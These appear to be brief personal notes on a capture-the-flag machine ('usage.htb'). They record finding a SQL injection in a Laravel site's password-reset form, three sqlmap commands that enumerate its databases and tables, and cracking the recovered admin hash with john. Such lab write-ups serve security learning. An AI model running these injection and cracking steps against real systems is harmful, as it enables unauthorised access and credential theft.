found laravel webpage: usage.htb

found admin panel:
admin.usage.htb

on the main website not the admin
found a login, reset password link
one of these seemed suseptable to a sqlinjection, intercepting the request 
and using it with sqlmqp got us the tables and latere the admin:passwordhash

sqlmap -r sqlmapfile -p email --level 5 --risk 3 --batch --threads 10 --dbs
sqlmap -r sqlmapfile -p email --level 5 --risk 3 --batch --threads 10 -D database_name --tables
sqlmap -r sqlmapfile -p email --level 5 --risk 3 --batch --threads 10 -D usage_blog --tables

cracking it with john